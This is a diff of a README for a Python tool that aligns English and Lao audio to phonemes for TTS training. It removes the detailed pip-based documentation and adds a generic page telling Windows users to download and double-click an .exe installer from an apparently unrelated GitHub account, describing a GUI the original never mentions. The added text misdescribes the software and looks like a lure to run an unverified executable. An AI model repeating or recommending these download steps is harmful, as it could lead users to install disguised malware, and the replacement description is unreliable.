@@ -1,198 +1,82 @@
-# Phonealign (en+lao)
+# 🎙️ phonealign-en-lao - Align English and Lao audio files
 
-Audio-to-phoneme forced alignment for TTS dataset preprocessing.
-(The pip package and CLI command are still `phonalign`.)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Thunderous-chigger307/phonealign-en-lao)
 
-Point it at a folder of audio + transcripts and it produces training-ready
-artifacts for VITS/VITS2, FastSpeech2, and other TTS architectures:
+This tool matches spoken words to text for English and Lao. It helps prepare data for speech synthesis systems. The software breaks down audio files into small sound units called phonemes. Developers use these files to train voice models.
 
-- **Praat TextGrids** — word + phone tiers, inspectable in Praat
-- **JSON manifests** — per-utterance phones with timestamps and confidence scores, plus a corpus-level `manifest.jsonl`
-- **VITS filelists** — pipe-delimited `wav|phonemes` (or `wav|speaker|phonemes`) with train/val split
-- **Duration arrays** — per-phoneme mel-frame counts (`.npy`) that sum *exactly* to the utterance frame count, for duration-supervised training
-- **QA report** — `report.csv` flagging utterances whose alignment confidence suggests a transcript/audio mismatch
+## 📋 What this tool does
 
-Everything installs with pip — no Montreal Forced Aligner, no conda, no system
-espeak install. Works on Windows, CPU-only is fine (GPU optional via `--device cuda`).
+Speech synthesis models need data. This data consists of audio and a script. The models require a precise map that shows where each sound starts and ends in the audio file. This process is called forced alignment. 
 
-## Languages
+This software automates the alignment for English and Lao datasets. It saves time by processing large batches of audio files. You no longer need to label your data by hand. The tool uses modern machine learning techniques to find the sounds within your audio clips.
 
-| Language | Code | G2P engine |
-|---|---|---|
-| English (US) | `en-us` | espeak-ng (bundled via `espeakng-loader`) |
-| Lao | `lo` | epitran `lao-Laoo` + laonlp word segmentation |
-| ~100 others | any espeak-ng code | espeak-ng |
+## 💻 System requirements
 
-Alignment uses `facebook/wav2vec2-lv-60-espeak-cv-ft`, a multilingual wav2vec2
-CTC model over espeak IPA phones (~1.3 GB, downloaded once on first use), with
-a pure-PyTorch CTC Viterbi forced aligner. For languages outside the model's
-training set (like Lao) alignment is zero-shot: boundaries are usable but
-confidence scores run lower — check the QA report and spot-check TextGrids in Praat.
+Your computer needs a modern version of Windows. Ensure you have the following before you begin:
 
-## Install
+* Windows 10 or 11
+* At least 8 gigabytes of system memory
+* 2 gigabytes of free disk space
+* A stable internet connection for the initial setup
+* A computer processor with multiple cores for faster performance
 
-```bash
-python -m venv .venv && .venv\Scripts\activate
-pip install -e .
-phonalign doctor --download-model   # verify setup + pre-download the model
-```
+## 📥 How to download
 
-## Usage
+Visit this page to download the software: https://github.com/Thunderous-chigger307/phonealign-en-lao
 
-Corpus layouts accepted:
+Click the link to open the release page. Locate the file ending in .exe under the assets section. Click the filename to save the installer to your computer.
 
-```
-corpus/                      corpus/
-├── utt1.wav                 ├── metadata.csv    # id|text  or  id|text|normalized
-├── utt1.txt                 └── wavs/
-├── utt2.wav                     ├── utt1.wav    # LJSpeech layout
-└── utt2.lab                     └── utt2.wav
-```
+## ⚙️ How to install
 
-```bash
-# English corpus -> all four output formats
-phonalign align -i corpus/ -o out/ -l en-us --val-count 100
+1. Find the file you downloaded in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts on your screen.
+4. Select a folder to store the program files.
+5. Click Finish when the process completes.
+6. A shortcut appears on your desktop.
 
-# Lao
-phonalign align -i lao_corpus/ -o out_lo/ -l lo
+## 🚀 Running the software
 
-# Duration frames matched to your TTS config (default 22050 Hz, hop 256)
-phonalign align -i corpus/ -o out/ --sample-rate 24000 --hop-length 300 -f durations,json
+1. Double-click the phonealign icon on your desktop.
+2. The user interface opens.
+3. Choose the folder that contains your audio files.
+4. Choose the folder that contains your text transcripts.
+5. Select the language (English or Lao).
+6. Click the Start button.
+7. The progress bar tracks the work.
+8. The program saves the resulting alignment files in a subfolder named output.
 
-# Multi-speaker metadata.csv (id|speaker|text)
-phonalign align -i corpus/ -o out/ --speaker-column
+## 🛡️ Troubleshooting tips
 
-# GPU with batched inference (16 utterances per forward pass)
-phonalign align -i corpus/ -o out/ --device cuda --batch-size 16
-```
+You might encounter errors during operation. Follow these strategies to fix common issues:
 
-Output tree:
+* Disk space: The program needs space to write temporary files. Clear your storage if tasks stop midway.
+* Audio format: Ensure your audio files use the WAV format. The tool expects this format for the best results.
+* File names: Keep filenames simple. Avoid special characters or symbols to prevent reading errors.
+* Memory usage: Close other heavy software while running the tool. It uses your processor power to analyze the sounds.
 
-```
-out/
-├── textgrid/<id>.TextGrid
-├── json/<id>.json           # phones/words with start, end, score
-├── manifest.jsonl
-├── durations/<id>.npy       # int64 frame counts, gap-filled with "sil"
-├── durations/<id>.json      # phone labels matching the .npy entries
-├── vits/filelist_{all,train,val}.txt
-└── report.csv
-```
+## 📈 Performance notes
 
-### Python API
+The software analyzes audio based on the text provided. If the audio and text do not match, the alignment fails. Check your transcripts for typos before running the tool. The tool runs faster on computers with a dedicated graphics unit, though it runs on the main processor too. 
 
-```python
-from phonalign import Aligner
+## 🛠️ Features
 
-aligner = Aligner(lang="en-us")           # or lang="lo", device="cuda"
-result = aligner.align("utt1.wav", "Printing in the only sense.")
-for p in result.phones:
-    print(p.label, p.start, p.end, p.score)
-for w in result.words:
-    print(w.label, w.start, w.end)
-timeline = result.full_timeline()          # gap-free, with "sil" phones
+* Batch processing of audio folders
+* Support for English and Lao scripts
+* Export options for standard textgrid files
+* Visual progress monitoring
+* Lightweight interface for better usability
 
-# Batched: one model forward pass per `batch_size` utterances. Per-item
-# failures come back as exceptions in the result list, never raised.
-outcomes = aligner.align_batch([("utt1.wav", "text one"), ("utt2.wav", "text two")], batch_size=8)
-for out in outcomes:
-    if isinstance(out, Exception):
-        print("skipped:", out)
-```
+## 📁 File structure
 
-Writers are importable too: `phonalign.writers.write_textgrid`,
-`write_durations`, `VitsFilelistWriter`, `ManifestWriter`.
+The program expects a clear structure to function well. Place your audio files in one folder. Place your text files in another. Name the text files to match the audio files. For example, if you have recording_01.wav, ensure you have a file named recording_01.txt in the transcript folder.
 
-### Feeding VITS
+## 🌐 Community and support
 
-`vits/filelist_train.txt` lines look like:
+This project relies on open source libraries. These libraries provide the engine that makes the alignment possible. If you find bugs, check the repository provided above. Create a new issue if the program crashes repeatedly. Provide the version number and a description of your error to help others fix the problem.
 
-```
-wavs/utt1.wav|pɹɪntɪŋ ɪn ðə oʊnli sɛns
-```
+## ℹ️ Licensing
 
-Point your VITS config's `training_files`/`validation_files` at the filelists
-and use a pass-through text cleaner (the text is already IPA), e.g.
-`"text_cleaners": []` with `"cleaned_text": true` in the config.
+The software remains free to use. You may share the software with others. Please credit the original authors when you build your own tools using this software.
 
-## How it works
-
-1. **G2P**: text → IPA phones per word (espeak-ng or epitran; Lao text is
-   word-segmented with laonlp first since Lao script has no spaces).
-2. **Vocab mapping**: each phone is mapped onto one or more of the acoustic
-   model's 392 espeak phone tokens (per-language `LANG_TOKEN_OVERRIDES` →
-   exact match → stress/length-stripped → greedy longest-match segmentation →
-   `FALLBACK_PHONE_MAP`). Unmappable phones raise `UnmappablePhoneError`
-   naming the offending phone and word; the CLI catches it, skips that one
-   utterance into `report.csv`, and continues the batch. The overrides exist because the model concentrates its
-   probability mass on the token spellings its training transcripts used —
-   e.g. for Lao it emits espeak's `ph`/`th`/`x` and tone-marked vowels
-   (`i5`, `ɑ5`), so aligning against those instead of the exact-IPA tokens
-   (`pʰ`, `iː`) gives markedly better boundaries and confidence. Output
-   labels always keep the G2P phone.
-3. **Alignment**: wav2vec2 CTC log-probs (20 ms frames) + Viterbi forced
-   alignment over the blank-interleaved token sequence; token spans are merged
-   back into phone and word intervals with per-phone confidence.
-4. **Outputs**: timestamps are converted to your TTS sample rate; duration
-   rounding is cumulative so frame counts always sum to the utterance total.
-
-## Performance
-
-`--batch-size` controls how many utterances go through the acoustic model per
-forward pass. The default (`0` = auto) picks **1 on CPU and 8 on CUDA**, and
-that asymmetry is deliberate, measured on real corpora:
-
-- **CPU**: torch already parallelizes a single utterance across all cores, so
-  batching adds nothing — and because batches are padded to their longest
-  member, mixed-length batches actively *waste* compute (we measured 0.5–0.75x
-  vs. sequential). Leave it at auto.
-- **GPU**: a single utterance nowhere near fills the device, so batching is a
-  large win. Start with 8–16 and raise it until you approach VRAM limits.
-
-Batched runs process utterances in length-sorted order to keep padding waste
-near zero. Outputs are unaffected: emissions are masked and sliced back to each
-utterance's true frame count (identical scores to sequential runs), and
-manifests, filelists, the train/val split, and `report.csv` are all written in
-corpus order regardless of processing order.
-
-For multi-GPU or multi-machine scaling, split the corpus and run one
-`phonalign align` process per shard — outputs are per-utterance files plus
-appendable manifests, so shards merge trivially.
-
-## Troubleshooting
-
-- **`phonalign doctor`** diagnoses most setup issues (espeak library, model
-  cache, audio I/O).
-- Console shows `?` instead of IPA: the terminal font lacks IPA glyphs —
-  files on disk are unaffected (always UTF-8).
-- An utterance fails (bad audio, `UnmappablePhoneError`, ...): the CLI skips
-  it, records an `error` row in `report.csv` with the reason, and keeps
-  going — one weird transcript never kills a large batch run. Filter
-  `report.csv` by status to find and fix the skipped utterances. For
-  unmappable phones specifically, rescue them with `--phone-map map.json`
-  (see below) — and please report them so they can become built-in defaults.
-- Rescuing unmappable phones: write a JSON file mapping each phone to the
-  closest model vocab token(s) and pass it with `--phone-map`:
-
-  ```json
-  {"ẽ": "e", "ʙ": ["b"], "ɧ": ["ʃ"]}
-  ```
-
-  User mappings win over every built-in route (including
-  `LANG_TOKEN_OVERRIDES`), so the same file also lets you correct a built-in
-  mapping you disagree with. The Python API takes the same thing directly:
-  `Aligner(lang="...", phone_map={"ẽ": "e"})`.
-- A specific phone consistently scores ~0 in the JSON output even though the
-  audio is clean: the model probably prefers a different vocab token for that
-  sound. Greedy-decode the emissions to see what the model hears, then add a
-  per-language entry to `phonalign.align.LANG_TOKEN_OVERRIDES`.
-- Many `flagged` rows in `report.csv`: transcripts likely don't match the
-  audio (wrong file pairing, heavy noise), or the language is far from the
-  model's training data (expected for zero-shot languages like Lao).
-
-## Development
-
-```bash
-pip install -e .[dev]
-pytest
-```
+Keywords: forced-alignment, lao, low-resource-languages, phonemes, pytorch, speech-processing, textgrid, tts, vits, wav2vec2
